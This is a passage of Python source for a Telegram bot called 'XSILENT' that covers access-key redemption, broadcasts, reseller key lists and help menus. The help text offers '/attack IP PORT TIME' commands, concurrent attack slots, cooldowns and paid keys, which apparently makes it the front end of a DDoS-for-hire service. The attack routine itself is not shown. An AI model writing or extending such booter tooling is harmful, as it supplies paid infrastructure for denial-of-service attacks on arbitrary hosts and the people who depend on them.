def redeem(msg):
    uid = str(msg.chat.id)
    
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /redeem KEY")
        return
    
    key = args[1]
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used!")
        return
    
    if time.time() > key_info.get("expires_at", 0):
        bot.reply_to(msg, "❌ Key expired!")
        return
    
    key_info["used"] = True
    key_info["used_by"] = uid
    key_info["used_at"] = time.time()
    save_keys(keys_data)
    
    if uid not in users:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    expiry_date = datetime.fromtimestamp(key_info["expires_at"]).strftime('%Y-%m-%d %H:%M:%S')
    bot.reply_to(msg, f"✅ KEY REDEEMED!\n👤 User: {uid}\n⏰ Access until: {expiry_date}")

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    if msg.reply_to_message:
        success = 0
        failed = 0
        
        for user in users:
            try:
                if msg.reply_to_message.text:
                    bot.send_message(user, f"📢 BROADCAST:\n\n{msg.reply_to_message.text}")
                elif msg.reply_to_message.photo:
                    bot.send_photo(user, msg.reply_to_message.photo[-1].file_id, 
                                  caption=msg.reply_to_message.caption or "📢 BROADCAST")
                elif msg.reply_to_message.video:
                    bot.send_video(user, msg.reply_to_message.video.file_id,
                                  caption=msg.reply_to_message.caption or "📢 BROADCAST")
                success += 1
            except:
                failed += 1
        
        bot.reply_to(msg, f"✅ Broadcast sent!\nSent: {success}\nFailed: {failed}")
    else:
        bot.reply_to(msg, "📝 Reply to a message with /broadcast to send it to all users!")

@bot.message_handler(commands=['mykeys'])
def my_keys(msg):
    uid = str(msg.chat.id)
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked!")
        return
    
    if uid not in resellers and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Reseller only!")
        return
    
    user_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expiry = datetime.fromtimestamp(info["expires_at"]).strftime('%Y-%m-%d')
            user_keys.append(f"🔑 {key[:10]}... | {format_duration(info['duration_value'], info['duration_unit'])} | Exp: {expiry}")
    
    if user_keys:
        bot.reply_to(msg, "📋 YOUR KEYS:\n" + "\n".join(user_keys))
    else:
        bot.reply_to(msg, "📋 No keys generated yet.")

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    
    if uid in ADMIN_ID:
        help_text = f"""👑 XSILENT OWNER HELP 👑

📝 COMMANDS:

/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check your cooldown
/setmax 1-100 - Set concurrent limit
/setcooldown 1-300 - Set cooldown time

/genkey 1 or 5h - Generate key
/removekey KEY - Remove key

/add USER - Add user
/remove USER - Remove user
/addreseller USER - Add reseller
/removereseller USER - Remove reseller

/addgroup GROUP_ID TIME - Add group
/removegroup GROUP_ID - Remove group
/block USER_ID REASON - Block user
/unblock USER_ID - Unblock user
/blockedlist - List blocked users

/host BOT_TOKEN USER_ID CONCURRENT OWNER_NAME - Host bot
/unhost BOT_TOKEN - Remove hosted bot
/blockhostbot BOT_TOKEN REASON - Block hosted bot
/unblockhostbot BOT_TOKEN - Unblock hosted bot

/maintenance on/off - Maintenance mode
/broadcast - Broadcast (text/photo/video)
/stopattack IP:PORT - Stop attack
/allusers - List users
/allgroups - List groups
/allhosts - List hosted bots
/api_status - API status

⚡ Concurrent: {MAX_CONCURRENT}
⏳ Cooldown: {COOLDOWN_TIME}s
🛒 Buy: XSILENT"""
    else:
        help_text = """🔥 XSILENT BOT HELP

/attack IP PORT TIME - Launch attack
/status - Check slots
/cooldown - Check cooldown
/redeem KEY - Redeem access key

For support contact owner."""
    
    bot.reply_to(msg, help_text)

# Cleanup thread
def cleanup():
    while True:
        time.sleep(5)
        now = time.time()
        for aid, info in list(active_attacks.items()):
            if now >= info["finish_time"]:
                del active_attacks[aid]

threading.Thread(target=cleanup, daemon=True).start()

print("=" * 50)
print("👑 XSILENT BOT STARTED SUCCESSFULLY!")
print(f"Owner: {ADMIN_ID[0]}")
print(f"Max Concurrent: {MAX_CONCURRENT}")
print(f"Cooldown: {COOLDOWN_TIME}s")
print(f"Hosted Bots: {len(hosted_bots)}")
print("=" * 50)

bot.infinity_polling()
